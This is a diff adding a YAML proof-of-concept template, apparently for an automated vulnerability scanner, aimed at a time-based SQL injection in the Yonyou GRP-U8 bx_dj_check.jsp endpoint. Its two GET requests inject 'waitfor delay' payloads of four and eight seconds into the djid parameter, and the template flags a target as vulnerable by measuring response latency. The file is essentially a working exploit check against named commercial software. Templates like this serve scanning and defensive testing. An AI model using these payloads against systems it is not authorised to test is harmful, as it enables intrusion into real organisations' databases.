@@ -1,0 +1,24 @@
+name: poc-yaml-yongyouGRP-U8-bx_dj_check.jsp-sql-XVE-2024-10537
+transport: http
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:4'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 4000 && response.latency <= 5000
+  r1:
+    request:
+      method: GET
+      path: /u8qx/bx_dj_check.jsp?djlxdm=OER&djid=1';waitfor+delay+'0:0:8'--
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+    expression: response.latency >= 8000 && response.latency <= 9000
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488103&idx=1&sn=15f216fcd20addb9ef1f82bbcb50beb4&chksm=c267a754f5102e42b49fcab1ba9adb24013501f15c8b9f6c9aff9ae5b51fef262259454368a3&token=1431500657&lang=zh_CN#rd
